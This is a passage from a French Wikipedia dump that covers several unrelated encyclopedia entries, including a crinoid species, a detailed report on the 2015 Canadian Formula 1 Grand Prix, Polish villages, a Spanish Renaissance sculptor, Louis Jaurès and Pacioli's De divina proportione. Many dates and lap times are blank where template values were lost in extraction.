Il reste en Alsace durant la majeure partie de sa carrière, travaillant en tant qu'illustrateur pour des journaux et des agences publicitaires.
Il meurt dans le Haut-Rhin, à Mulhouse.

</doc>
<doc id="8980259" url="https://fr.wikipedia.org/wiki?curid=8980259" title="Himerometra robustipinna">
Himerometra robustipinna

Himerometra robustipinna, communément appelé la Comatule rouge, est une espèce de crinoïdes de la famille des Himerometridae.
Description et caractéristiques.
"Himerometra robustipinna" est une comatule de grande taille, portant généralement entre 33 et 62 bras, mesurant généralement une vingtaine de centimètres de long chacun, pour un diamètre général pouvant dépasser . Sa couleur est généralement rouge ou bordeaux, avec un rachis souvent clair et bien visible, et la pointe des pinnules parfois jaune. Il existerait aussi en Australie une forme alternative noire et blanche. Les cirrhes sont généralement annelés.
Au niveau squelettique, ses pinnules proximales sont robustes et élargies et s'affinent rapidement ou graduellement vers la pointe. On compte 20 à 42 segments brachiaux, presque tous sont plus larges que longs, avec une terminaison distale peu modifiée ou gonflée, mais jamais garnie d'épines. Les bords distaux des segments brachiaux proximaux sont lisses ou légèrement protubérants.
Cette espèce possède également en Australie une forme alternative (anciennement appelée "Himerometra magnipinna"), noire aux bras blancs striés de noir ; elle est plus grêle et souvent perchée sur des gorgones, à la manière ces Colobometridae. 
Habitat et répartition.
On trouve cette comatule dans la région océanienne (Indonésie, Philippines, Mer de Chine jusqu'au sud du Japon, Australie du Nord et de l'Est…), à l'ouest jusqu'aux Maldives et à l'est jusqu'en Nouvelle-Calédonie et Polynésie.
Elle habite les récifs de corail, entre la surface et de profondeur, souvent peu profonds. Elle vit souvent assez exposée.
Notes et références.
Le gobie vit entre ses bras pennés sans doute pour se protéger des prédateurs.

</doc>
<doc id="8980273" url="https://fr.wikipedia.org/wiki?curid=8980273" title="Grand Prix automobile du Canada 2015">
Grand Prix automobile du Canada 2015

Le Grand Prix automobile du Canada 2015 (Formula 1 Grand Prix du Canada 2015), disputé le sur le circuit Gilles-Villeneuve, est la du championnat du monde de Formule 1 courue depuis 1950. Il s'agit de la quarante-cinquième édition du Grand Prix du Canada comptant pour le championnat du monde de Formule 1, la trente-sixième disputée sur le circuit temporaire de l'Île Notre-Dame de Montréal, et de la septième manche du championnat 2015.
Lewis Hamilton réalise la quarante-quatrième pole position de sa carrière, sa sixième en sept courses cette saison, en repoussant son coéquipier Nico Rosberg à trois dixièmes de seconde. Kimi Räikkönen, troisième, se montre le meilleur derrière les Flèches d'Argent ; il est accompagné en deuxième ligne par Valtteri Bottas tandis que les Lotus obtiennent leur meilleur résultat en qualifications cette année en occupant la troisième ligne (Romain Grosjean cinquième et Pastor Maldonado sixième). Sebastian Vettel, victime de problèmes électroniques sur sa Ferrari SF15-T, éliminé dès la première phase des qualifications, est pénalisé d'un recul de cinq places sur la grille pour avoir dépassé une monoplace sous régime de drapeau rouge lors de la dernière séance d'essais libres.
Lewis Hamilton contrôle Nico Rosberg du premier virage au soixante-dixième passage dans la dernière chicane du circuit Giles-Viilleneuve pour remporter sa quatrième victoire au Canada, la trente-septième de sa carrière et la quatrième, en sept Grands Prix, cette saison. Les Flèches d'argent réalisent leur vingtième doublé avec quarante secondes d'avance sur la Williams FW36 de Valtteri Bottas, qui profite du tête à queue de Kimi Räikkönen à la sortie de l'épingle au vingt-huitième tour pour monter sur le podium. Sebastian Vettel remonte de la dix-huitième place sur la grille à la cinquième et finit quatre secondes derrière son coéquipier ; Felipe Massa réalise une performance similaire en partant quinzième pour terminer sixième. Pastor Maldonado, septième, est le dernier pilote arrivé dans le même tour que les Mercedes. Nico Hülkenberg se classe huitième, Daniil Kvyat neuvième et Romain Grosjean prend le point restant en raison d'un accrochage avec Will Stevens qui lui a fait perdre sa cinquième place et lui a coûté cinq secondes de pénalité. 
Lewis Hamilton, toujours en tête du championnat du monde, augmente de 7 points son avance sur son coéquipier Rosberg (désormais 151 points contre 134) et devance toujours les pilotes Ferrari, Sebastian Vettel (108 points) et Kimi Räikkönen (72 points). Valtteri Bottas (57 points) et son coéquipier Felipe Massa (47 points), suivent. Daniel Ricciardo (35 points) précède son coéquipier Daniil Kvyat (19 points) et Romain Grosjean (17 points) qui repasse devant Felipe Nasr (16 points). 
Mercedes conserve la tête du championnat, avec 285 points, devant Ferrari (180 points) et Williams (104 points) ; suivent Red Bull Racing (54 points), Lotus (23 points), Force India (21 points), Sauber (21 points), Scuderia Toro Rosso (15 points) et McLaren (4 points). Manor Marussia n'a pas encore inscrit de point.
Essais libres.
Première séance, le vendredi de 10 h à 11 h 30.
Si le ciel est très nuageux, il ne pleut pas au départ de la première séance d'essais libres du Grand Prix du Canada et aucunes précipitations ne sont annoncées pour cette session ; la température de l'air est de 17 °C. Le tracé de l'île Notre-Dame a été réaménagé au niveau de la dernière chicane où l'intérieur du virage comporte désormais un couloir que les pilotes ne doivent pas couper pour gagner du temps. Alors que les pilotes réalisent leurs premiers tours d'installation pour se familiariser avec le circuit, Jenson Button est victime d'un problème de boîte de vitesses : celle-ci reste bloquée sur le deuxième rapport dès son premier tour et le contraint à rentrer au stand au ralenti. Nico Rosberg établit le temps de référence en mais est aussitôt battu par son coéquipier Lewis Hamilton en ; il poursuit sur sa lancée et tourne ensuite en et .
Nico Rosberg repasse peu après en tête, en , mais Hamilton, toujours avec le train de pneus Pirelli réservé aux trente premières minutes d'essais, reprend le meilleur sur son coéquipier, en . Jenson Button, qui a pu reprendre la piste, est une nouvelle fois au ralenti : après une demi-heure, le Britannique n'a pas réalisé le moindre tour chronométré (il ne pourra le faire qu'après cinquante minutes). Les pilotes rentrent tous au stand et y restent assez longtemps car les commissaires de piste doivent retirer des agrafes répandues dans la voie des stands par un malveillant.
À la reprise, Hamilton, en , réalise le meilleur temps de la séance. Alors qu'il est informé de cette performance par son ingénieur de piste, Daniil Kvyat répond sèchement : Carlos Sainz Jr., Valtteri Bottas et Hamilton partent chacun en tête-à-queue, sans conséquence ; Sainz rencontre, par la suite, un problème technique au bout de la voie des stands et doit être ramené par ses mécaniciens. En fin de séance, la plupart des pilotes préparent la course en faisant de longs relais et les temps au tour n'évoluent plus. Romain Grosjean conserve donc sa troisième place, à plus d'une seconde de Rosberg, et devance d'un souffle Nico Hülkenberg et Sebastian Vettel.
Deuxième séance, le vendredi de 14 h à 15 h 30.
La deuxième séance d'essais libres commence avec 21 °C dans l'air et 32 °C degrés sur la piste ; s'il fait sec au départ, la menace de pluie est bien réelle. Contrairement à la première séance, les pilotes, inquiets de la tournure que prend la météo, montent en piste dès son ouverture. Certains pilotes choisissent même de chausser les pneus les plus tendres fournis par Pirelli (spécification « supertendre »). Ainsi équipé, Sebastian Vettel réalise le temps de référence en .
Kimi Räikkönen, sur l'autre Ferrari, chaussé lui aussi des pneus les plus rapides, prend l'avantage en mais Vettel repasse en tête en . Nico Rosberg, qui n'a pas encore utilisé ses pneus plus les plus tendres, est repoussé à sept dixièmes de seconde tandis que son coéquipier Lewis Hamilton, dans un tour rapide, évite de peu Romain Grosjean dans la dernière chicane. Vettel améliore à nouveau, en , forçant Rosberg à chausser également les pneus les plus performants.
Malgré ce, Rosberg ne parvient pas à battre Vettel qui conserve un dixième de seconde d'avantage sur son compatriote. Pendant que Nico Hülkenberg, ralenti par une crevaison à l'arrière-gauche, rejoint doucement son stand, Lewis Hamilton, passé aux « supertendres » décolle sur le vibreur de la dernière chicane mais évite de taper le « mur des champions ». Dès le tour suivant, alors que la séance est entamée depuis un quart d'heure et que le ciel est de plus en plus menaçant, il réalise le meilleur temps, en .
Par la suite, l'ensemble des pilotes du plateau se lance dans les longs relais avec les deux mélanges de gommes en espérant recueillir un maximum d'informations avant l'arrivée prévue de la pluie. Après trente-cinq minutes d'essais, elle apparaît et tous rentrent aux stands : comme les prévisionistes annoncent un temps sec pour le reste du weekend, les équipes n'ont aucun intérêt à risquer un accident sous la pluie. Cependant, après un quart d'heure, les deux pilotes Mercedes reprennent la piste, en pneus intermédiaires, sous les applaudissements du public. La pluie ne cesse de s'intensifier et Hamilton part en aquaplanage à l'épingle et tape le mur. Le drapeau rouge est agité pour permettre l'évacuation de la monoplace ; tirée fortement par un tracteur pour être dégagée du mur de pneumatiques, elle percute, par l'arrière, le véhicule de secours dépêché sur les lieux. 
La direction de course relance la séance quelques minutes plus tard mais la pluie tombe encore plus fort que lors de l'accident d'Hamilton, ce qui dissuade les autres concurrents de s'élancer. Hamilton conserve donc le meilleur temps devant Vettel, Räikkönen et Rosberg ; suivent Pastor Maldonado, à une demi-seconde du meilleur temps, Valtteri Bottas et Romain Grosjean, à huit dixièmes de seconde et Felipe Massa, repoussé à plus d'une seconde.
Troisième séance, le samedi de 10 h à 11 h.
Après le déluge tombé sur le circuit Gilles Villeneuve lors de la deuxième séance d'essais libres, la troisième séance se déroule sous un beau soleil et sur une piste sèche. Les pilotes montent en piste dès son ouverture car les écuries ont beaucoup de travail : il faut préparer les qualifications et également travailler sur les longs relais, ce qui n'a pas pu être fait hier à cause de la pluie. La session commence très mal pour Fernando Alonso puisque McLaren doit remplacer son moteur Honda. Daniel Ricciardo frôle le « mur des champions » avant de sortir de la piste dans le premier virage, sans conséquence. Kimi Räikkönen réalise le temps de référence, en .
Son coéquipier Sebastian Vettel passe ensuite en tête en ; s'ensuit une lutte pour la position de tête entre les deux pilotes puisque Räikkönen améliore en deux temps ( puis ), puis cède face à Vettel qui tourne en . Pastor Maldonado et Felipe Massa s'immiscent ensuite entre les deux Ferrari. Tous ces temps ont été réalisés avec le mélange le plus dur proposé par Pirelli et les Mercedes n'ont pas encore pris la piste. 
Nico Rosberg, chaussé de pneus durs, se mêle ensuite au combat et passe en tête en . Valtteri Bottas, avec les mêmes pneus, se rapproche à moins de trois dixièmes de seconde et son coéquipier Felipe Massa tourne dans le même rythme. Romain Grosjean réalise le septième temps tandis que Vettel se hisse à quatre dixièmes de seconde de Rosberg qui réagit en améliore son temps de 21 millièmes de seconde (). Grosjean atteint la deuxième place, à un dixième de seconde puis, sur sa lancée, échoue à un centième de seconde de l'Allemand. Räikkönen améliore alors, en , Nico Hülkenberg se rapproche à trois dixièmes de seconde du meilleur temps et Daniil Kvyat évolue à quatre dixièmes de seconde.
Felipe Nasr perd le contrôle de sa Sauber C34 en zigzaguant pour faire monter ses pneumatiques en température dans la ligne droite (il a appuyé accidentellement sur le bouton de commande de l'aileron arrière mobile et a perdu son appui à l'arrière. Il tape le mur presque de face et provoque l'interruption de la séance sur drapeau rouge alors qu'il restait 22 minutes avant le drapeau à damier. Si le pilote est indemne, sa monoplace est chiffonnée à la hauteur du train avant et les commissaires ont beaucoup de travail pour déblayer la piste. 
La séance est relancée pour 12 minutes et l'ensemble des pilotes du plateau ressort en pneus « supertendres ». Räikkönen améliore sa performance, en mais s'incline face à Rosberg qui tourne en . Jenson Button arrête une nouvelle fois sa McLaren MP4-30 en piste (et ne pourra pas participer à la séance de qualification), ce qui provoque une seconde interruption, définitive, de la séance. Lewis Hamilton, qui n'a jamais pu obtenir le moindre tour clair n'a réalisé que le vingtième et dernier temps de la session.
Séance de qualifications.
Résultats des qualifications.
Session Q1.
Il fait très beau et chaud au départ de la première phase des qualifications du Grand Prix du Canada. Alors que Jenson Button est privé de qualifications, sa monoplace n'étant pas encore réparée par ses mécaniciens (changement de moteur), son coéquipier Fernando Alonso est le premier en piste ; seuls quatre pilotes seront donc éliminés sur la piste lors de cette session. Dès le début de la séance, alors qu'il n'a pas effectué le moindre tour lancé, Sebastian Vettel rencontre un problème lié au "MGU-K" de son unité de puissance et rentre au stand. Valtteri Bottas fixe le temps de référence en . 
Kimi Räikkönen améliore en puis s'incline face à Nico Rosberg () et Lewis Hamilton, en trois temps (, puis ). Le Britannique devance ainsi Rosberg et Räikkönen et, plus surprenant, Marcus Ericsson, quatrième au volant de la Sauber C34. Pour deux millièmes de seconde, Rosberg s'empare ensuite du meilleur tour () tandis que Pastor Maldonado accède au troisième rang juste avant de partir à la faute au premier virage ; bloqué dans l'herbe, il doit solliciter l'aide des commissaires pour reprendre la piste.
À mi-séance, les deux pilotes Manor Marussia et Felipe Nasr (qui n'a pas réalisé le moindre tour chronométré) sont en passe d'être éliminés. Nasr, dès ses premiers tours lancés, se hisse au quatorzième rang et repousse son compatriote Felipe Massa dans la zone éliminatoire. Dans les dernières minutes, la plupart des pilotes passe les pneumatiques les plus tendres et, ainsi chaussé, Romain Grosjean se porte en tête, en , avec presque un dixième de seconde d'avance sur les Mercedes. Vettel prend la piste dans les dernières minutes mais ne se montre pas suffisamment rapide pour accéder à la Q2, de même que Massa qui se plaint d'une perte de puissance (une attache a cassé dans le mécanisme de la soupape de décharge du turbocompresseur). Les cinq pilotes éliminés sont Button (qui n'a pas tourné), Vettel, Massa et les deux coéquipiers Will Stevens et Roberto Merhi. Button, déjà en fond de grille, voit ses quinze places de pénalité converties en "" pendant la course.
Session Q2.
Tous les pilotes entrent en piste avec les pneus les plus tendres proposés par Pirelli afin d'augmenter leurs chances d'accéder à la phase Q3. D'emblée, Romain Grosjean fixe le temps de référence en et devance Nico Hülkenberg d'un dixième de seconde et demi. Kimi Räikkönen améliore de trois dixièmes de seconde () avant que les Mercedes n'entrent en lice. 
Lewis Hamilton, en , s'empare de la tête et devance, de douze millièmes de seconde seulement, son coéquipier Nico Rosberg. Räikkönen est ainsi relégué à une seconde puis recule encore d'un rang quand Valtteri Bottas réalise un tour en . À cinq minutes du terme, sont en passe d'être éliminés Carlos Sainz Jr. et son coéquipier Max Verstappen, les pilotes Sauber (Felipe Nasr et Marcus Ericsson) qui ne disposent pas de la dernière évolution du moteur Ferrari, et Fernando Alonso. 
Grosjean, grâce à un tour en , remonte au troisième rang, à une demi-seconde des Mercedes. Sainz améliore (), prend la dixième place et élimine un temps Daniil Kvyat. Le Russe reprend néanmoins l'avantage en toute fin de séance (). Les cinq pilotes éliminés sont ainsi Sainz, Verstappen, Nasr, Ericsson et Alonso. Max Verstappen, qui n'est donc pas en mesure de purger sur la grille ses quinze places de pénalité devra observer dix secondes de pénalité en course.
Session Q3.
Le circuit étant parmi les plus rapides de la saison, les pilotes peuvent espérer enchaîner plusieurs tentatives pour tenter de conquérir la meilleure place possible sur la grille de départ. Lewis Hamilton, Nico Rosberg, Kimi Räikkönen et Valtteri Bottas maximisent leurs chances car ils disposent de deux trains de pneus neufs « supertendres », n'ayant pas utilisé cette spécification lors de la phase Q1. Pour la première fois de la saison, les deux Force India VJM08 sont en Q3. 
Nico Hülkenberg établit le temps de référence en mais est battu d'une seconde par Räikkönen ; Pastor Maldonado accède au deuxième rang, à deux dixièmes de seconde du Finlandais, juste devant Bottas. Pour son second tour lancé, Hamilton prend le commandement, en , et précède Nico Rosberg qui tourne en avec un train de pneus déjà utilisés en Q2. Räikkönen, quatrième, tourne en et devance Grosjean et Maldonado qui, sortant ensemble de leur garage, manquent de s'accrocher.
Dans sa dernière tentative, Räikkönen améliore sa performance mais reste à six dixièmes des Mercedes. Bottas hisse sa Williams FW36 au quatrième rang, devant les deux Lotus E23 Hybrid de Grosjean et Maldonado. Lewis Hamilton n'améliore pas mais comme Nico Rosberg, malgré son train de pneus neufs, ne parvient pas à le surpasser, la pole position revient au champion du monde en titre. Nico Rosberg se place à ses côtés pour une première ligne Mercedes ; Räikkönen et Bottas constituent une deuxième ligne finlandaise et les Lotus monopolisent la troisième.
Course.
Déroulement de l'épreuve.
La température ambiante est de 21 °C, la piste est à 39 °C et le soleil brille au départ du Grand Prix du Canada. Lewis Hamilton est en pole position aux côtés de son coéquipier Nico Rosberg. Les Finlandais Kimi Räikkönen et Valtteri Bottas occupent la deuxième ligne devant les Lotus E23 Hybrid de Romain Grosjean et Pastor Maldonado. Sebastian Vettel, victime d'un problème technique puis pénalisé d'un recul de cinq places, s'élance depuis la dix-huitième place, devant Max Verstappen et Jenson Button, tous deux condamnés à purger une pénalité en course (' de dix secondes pour Verstappen et ' pour Button). Alors que la plupart des pilotes s'élancent en pneus « supertendres », ceux qui s'élancent en fond de grille, comme Felipe Massa, Verstappen, Button et les deux pilotes Manor Marussia, ont choisi les pneus les plus durs. 
À l'extinction des feux, Hamilton conserve la tête devant Rosberg, Räikkönen (qui attaque, sans succès, Rosberg), Bottas et Grosjean. Fernando Alonso gagne deux places et atteint le onzième rang tandis que Vettel, Verstappen et Button dépassent les Manor. Jenson Button effectue sa pénalité dès la fin du premier tour et, au premier passage sur la ligne de chronométrage, Hamilton devance Rosberg, Räikkönen, Bottas, Grosjean, Nico Hülkenberg, Maldonado, Daniil Kvyat, Daniel Ricciardo, Sergio Pérez, Alonso et Marcus Ericsson. Alonso ne tire pas longtemps profit de son bon départ à cause de la faible vitesse de pointe de sa McLaren MP4-30 : il est dépassé par Ericsson, Massa et Vettel, remonté au treizième rang. Hamilton creuse immédiatement un léger écart sur Rosberg qui reste sous la menace de Räikkönen. Au huitième tour, Hamilton, qui a porté son avance à deux secondes, ne parvient plus à augmenter son écart. Sebastian Vettel, bloqué dans le trafic, choisit de rentrer aux stands pour passer ses pneus tendres et bénéficier d'une piste dégagée mais son arrêt se prolonge de plus de six secondes et il repart dernier ; il dépasse néanmoins assez rapidement les Manor et Jenson Button pour entamer sa remontée au classement.
Au quatorzième tour, Hamilton possède 3 secondes d'avance sur Rosberg, 6 secondes sur Räikkönen et 8 secondes sur Bottas, les autres concurrents étant désormais largement distancés. Grâce à ses pneus tendres, Massa remonte au neuvième rang. Maldonado rentre parmi les premiers, au dix-huitième tour, pour changer ses pneus. Vettel attaque Alonso pour le gain de la quinzième place mais l'Espagnol lui résiste tellement que, dans la dernière chicane, Vettel doit monter sur le dos d'âne et lever le pied pour éviter de taper le « mur des champions » ; il doit patienter encore deux tours pour le passer. Ricciardo rentre au stand au vingt-quatrième tour, Pérez au suivant et Räikkönen, le premier pilote de tête à s'arrêter, au vingt-septième tour. Nico Rosberg, qui reçoit la consigne d'attaquer au maximum pour se mettre hors de portée du Finlandais en pneus neufs, est finalement aidé par Räikkönen lui-même qui part en tête-à-queue à l'épingle. Grosjean, Kvyat et Carlos Sainz Jr. stoppent au tour suivant ; Bottas, Hülkenberg, Ericsson, Hamilton (qui cède, pour un tour, sa place en tête), Rosberg (éphémère leader qui rate son freinage à l'épingle et ruine ses espoirs de victoire) et Alonso, s'arrêtent avant le trente-troisième tour. Au trente-quatrième tour, après la vague d'arrêts, Hamilton précède Rosberg d'une seconde et Bottas de 19 secondes ; suivent Räikkönen, Massa, Grosjean, Vettel, Maldonado, Hülkenberg, Kvyat, Verstappen et Pérez.
Nico Rosberg est informé d'une surchauffe de ses freins, pour autant, il ne ralentit que pendant trois tours avant de repartir à l'assaut de son coéquipier ; il se rapproche à une seconde d'Hamilton, victime du même problème. Vettel, sur une stratégie décalée, a repris la piste en huitième position après son deuxième arrête et attaque Hülkenberg à la dernière chicane : le pilote Force India part en tête-à-queue tandis que Vettel doit couper le virage. Au quarante-sixième tour, Fernando Alonso abandonne. Pour la première fois depuis ses débuts, en 2001, il abandonne trois fois consécutivement. En prenant un tour à Will Stevens, Romain Grosjean, cinquième, se rabat trop tôt et heurte l'aileron avant de la Marussia MR03 avec sa roue arrière-gauche ; comme l'incident s'est produit au niveau de la dernière chicane, les deux pilotes rentrent immédiatement au stand. Alors que Stevens s'exclame à la radio , le Français, qui fait changer son pneu crevé, reçoit une pénalité de cinq secondes ajoutées à son temps de course.
Alors que l'écart entre Hamilton et Rosberg reste aux alentours de la seconde mais jamais en dessous (ce qui interdit à la Mercedes N°6 d'utiliser son DRS dans les lignes droites) et que Bottas est solidement installé à la troisième place, Vettel poursuit sa remontée et dépasse, au cinquante-sixième tour, Maldonado pour le gain de la cinquième place. Jenson Button abandonne au cinquante-huitième tour, sur problème technique. Ressorti des stands onzième et hors des points, Grosjean s'empare de la dixième place aux dépens de Sergio Pérez et creuse un écart supérieur à cinq secondes pour s'assurer le point de la dixième place malgré sa pénalisation. Hamilton remporte sa quatrième victoire de la saison (sa quatrième également au Canada) tandis que Rosberg permet à Mercedes de réaliser son vingtième doublé. Valtteri Bottas se classe troisième ; suivent pour les points Räikkönen, Vettel, Massa, Maldonado, Hülkenberg, Kvyat et Grosjean.
Statistiques.
Le Grand Prix du Canada 2015 représente :
Au cours de ce Grand Prix :

</doc>
<doc id="8980276" url="https://fr.wikipedia.org/wiki?curid=8980276" title="Radzików-Oczki">
Radzików-Oczki

Radzików-Oczki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 69 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980278" url="https://fr.wikipedia.org/wiki?curid=8980278" title="Lygosoma neuhaussi">
Lygosoma neuhaussi



</doc>
<doc id="8980279" url="https://fr.wikipedia.org/wiki?curid=8980279" title="Francisco de la Maza (sculpteur)">
Francisco de la Maza (sculpteur)

Francisco de la Maza est un sculpteur espagnol originaire de Meruelo (Junta de Siete Villas) qui a travaillé à Valladolid, connu à partir de 1566, mort vers 1585.
Il a été un suiveur de Juan de Juni. Il a été le premier sculpteur originaire de Cantabrie qui s'est installé à Valladolid. Avec Esteban Jordán et Juan Bautista Beltrán, il a assuré la relève de Juan de Juni.
Biographie.
Il était marié avec Juana Hernández de Munar dont il a eu deux fils, Manuel et Diego. En 1585, sa fille Isabel est baptisée dans l'éflise paroissiale de San Andrés de Valladolid, avec pour parrain Juan de Nates.
Le , il a passé un contrat avec don Rodrigo Manuel pour réaliser quatre statues de pierre pour le jardin de sa maison de Valladolid.
Le , Juan de Anchieta lui donne un pouvoir.
En 1569, il intervient comme témoin dans le testament de Juan Bautista Beltrán.
En 1571, il est intervenu sur le retable de la Piedad de l'église paroissiale de Simancas.
Il a réalisé un Christ en Croix qui se trouve dans l'église paroissiale de Villabáñez (Valladolid) dont le contrat est signé en et terminé en 1572.
Entre 1577 et 1580, il a travaillé sur le "Chemin du Calvaire" du grand retable de l'église de Santa María de Torrelobatón
En 1578, il fait avec Andrés de Rada l'évaluation du retable de la grande chapelle ("capilla mayor") réalisé par les sculpteurs ("entalladores") étrangers Claudio et Isaac (Isaac de Juni ?) et les peintres Benito Rabuyate et Simón de Isla pour le monastère de San Francisco de Valladolid.
Il passe un contrat le pour l'exécution du tombeau avec gisant du religieux Antonio Romero terminé en 1579 et se trouvant l'église paroissiale de Traspinedo (province de Valladolid).
Il est un des sculpteurs qui sont intervenus sur le retable du maître-autel de l'église paroissiale de la Asunción de Tudela de Duero. Les autres intervenants son Manuel Álvarez et Gregorio Fernández qui l'a complété.
Le musée diocésain de Valladolid expose une "Pietà" qu'il a réalisée.

</doc>
<doc id="8980282" url="https://fr.wikipedia.org/wiki?curid=8980282" title="Louis Jaurès (1898-1918)">
Louis Jaurès (1898-1918)

Louis Jaurès (né le et mort le à Pernant) 
est le fils cadet de Jean Jaurès. Militaire du grade d'aspirant, engagé au 10e bataillon de chasseurs à pied, il est mort au front durant la Première Guerre mondiale.
Biographie.
Louis Paul Jaurès nait le à Nontron, en Dordogne, commune où son grand -père maternel exerçait en tant que sous–préfet.
Il passe une partie de sa jeunesse à Albi et de ses vacances au domaine de Bessoulet, dont les Jaurès jouissent depuis leur mariage et qui appartient alors à Philippine Gisclard la mère de Louise Jaurès.
Âgé d'alors seulement seize ans, son père, le député Jean Jaurès, est assassiné à la veille de la Première Guerre mondiale.
Élève assidu d'abord à Paris, puis au lycée de Castres, où il obtient de prix de version latine, il parvient à obtenir de sa mère l'autorisation de devancer de deux ans la date de son incorporation après avoir passé avec succès, toujours sur l'insistance de sa mère, la seconde partie du baccalauréat à Toulouse.
À dix-sept ans, il est incorporé au de dragons.
Il rejoint les rangs de l'armée , écrivait-il.
Affecté au de chasseurs à pied, l'aspirant Jaurès est tué sur le plateau de Chaudun, près de Pernant (Aisne) le , en faisant face à une patrouille allemande pour couvrir la retraite de ses compagnons.
Ni son corps, ni sa plaque militaire n'ont jamais été retrouvés.
Il est tout de même déclaré « mort pour la France », figure au tableau d'honneur de la Grande Guerre sous le prénom de "Paul" (son deuxième prénom). Son nom est inscrit depuis 1922 au monument aux morts de Villefranche-d'Albigeois.
Une stèle, surmontée du buste de son père, lui est consacrée à Chaudun. Elle est inaugurée le avec un discours du président du Conseil Léon Blum.

</doc>
<doc id="8980283" url="https://fr.wikipedia.org/wiki?curid=8980283" title="Radzików-Stopki">
Radzików-Stopki

Radzików-Stopki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 157 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980285" url="https://fr.wikipedia.org/wiki?curid=8980285" title="Christine and The Queens">
Christine and The Queens



</doc>
<doc id="8980286" url="https://fr.wikipedia.org/wiki?curid=8980286" title="Rogóziec">
Rogóziec

Rogóziec (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 82 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980289" url="https://fr.wikipedia.org/wiki?curid=8980289" title="Sphenomorphus senja">
Sphenomorphus senja

Sphenomorphus senja est une espèce de sauriens de la famille des Scincidae.
Répartition.
Cette espèce est endémique de Malaisie péninsulaire. Elle se rencontre dans les États de Perak et de Pahang.
Étymologie.
Le nom spécifique "senja" vient du malaisien "senja", le crépuscule, en référence au moment où le ciel au-dessus du Gunung Brinchang vire au orange vermillon, comme la couleur des flancs de cette espèce.

</doc>
<doc id="8980290" url="https://fr.wikipedia.org/wiki?curid=8980290" title="Sosenki-Jajki">
Sosenki-Jajki

Sosenki-Jajki (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village comptait approximativement une population de 44 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980291" url="https://fr.wikipedia.org/wiki?curid=8980291" title="Enchères à tout prix">
Enchères à tout prix

Enchères à tout prix ("") est une émission de téléréalité américaine diffusée depuis 2013 sur la chaîne TruTV.
En France, l'émission est diffusée depuis 2015 sur RMC Découverte.
Concept.
L'émission se déroule au port de Los Angeles et montre les ventes aux enchères du contenu de conteneurs lorsque ces derniers ne sont pas réclamés depuis plusieurs mois. La vente donne souvent lieu à des enchères très élevées.
Émissions similaires.
Le série "Storage Wars" a donné lieu à huit autres déclinaisons, basées sur le même principe :
Autres émissions similaires :

</doc>
<doc id="8980292" url="https://fr.wikipedia.org/wiki?curid=8980292" title="De divina proportione">
De divina proportione

De divina proportione ("De la proportion divine") est un livre de mathématiques écrit par Luca Pacioli et illustré par Léonard de Vinci aux alentours de 1498 à Milan et publié pour la première fois en 1509. Son sujet principal est la proportion mathématique (le titre renvoie au nombre d'or) et son application en géométrie, dans les arts et en architecture. La clarté du texte et des illustrations ont contribué au succès du livre et à sa diffusion au-delà des cercles mathématiques.
Contenu.
Le livre est composé de trois manuscrits, sur lesquels Pacioli a travaillé entre 1496 et 1498.
"Compendio divina proportione".
La première partie, "Compendio divina proportione" ("compendium sur la proportion divine"), étudie le nombre d'or d'un point de vue mathématique et explore ses applications. Elle contient également un discours sur les polyèdres réguliers et semi-réguliers et une discussion sur l'usage de la perspective par les peintres Piero della Francesca, Melozzo da Forlì et Marco Palmezzano.
"Trattato dell'architettura".
La deuxième partie, "Trattato dell'architettura" ("Traité d'architecture"), discute l'application des mathématiques à l'architecture dans le "De architectura" de Vitruve. Le texte compare les proportions du corps humain à celles de l'architecture antique.
"Libellus in tres partiales divisus".
La troisième partie, "Libellus in tres partiales divisus" ("Libelle divisé en trois parties"), est principalement une traduction en italien du texte latin de Piero della Francesca "De quinque corporibus regularibus", avec des exemples mathématiques.
Dans sa biographie de Piero della Francesca de 1550, Giorgio Vasari accuse Pacioli de plagiat.
Illustrations.
Après les trois parties de texte, se trouvent deux sections d'illustrations :
Histoire.
Pacioli produisit trois manuscrits du traité. Il offrit le premier avec une dédicace au duc de Milan, Ludovico il Moro, ce manuscrit est conservé à la bibliothèque de Genève. La seconde copie a été donnée à Galeazzo Sanseverino, elle est conservée à Milan, à la bibliothèque Ambrosienne. La troisième a été donnée à Pier Soderini, gonfalonnier de Florence, cette copie est perdue.
Le , est parue la première édition de "De divina proportione" chez à Venise.

</doc>
<doc id="8980294" url="https://fr.wikipedia.org/wiki?curid=8980294" title="Stara Wieś (Siedlce)">
Stara Wieś (Siedlce)

Stara Wieś (prononciation : ) est un village polonais de la gmina de Mordy dans le powiat de Siedlce de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-est de Mordy (siège de la gmina), à l'est de Siedlce (siège de le powiat) et à à l'est de Varsovie (capitale de la Pologne).
Le village comptait approximativement une population de 134 habitants en 2010.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Siedlce.&lt;br&gt;
Depuis 1999, il appartient administrativement à la voïvodie de Mazovie

</doc>
<doc id="8980296" url="https://fr.wikipedia.org/wiki?curid=8980296" title="Évadné (fille de Poséidon)">
Évadné (fille de Poséidon)



</doc>
<doc id="8980298" url="https://fr.wikipedia.org/wiki?curid=8980298" title="Stok Ruski">
Stok Ruski

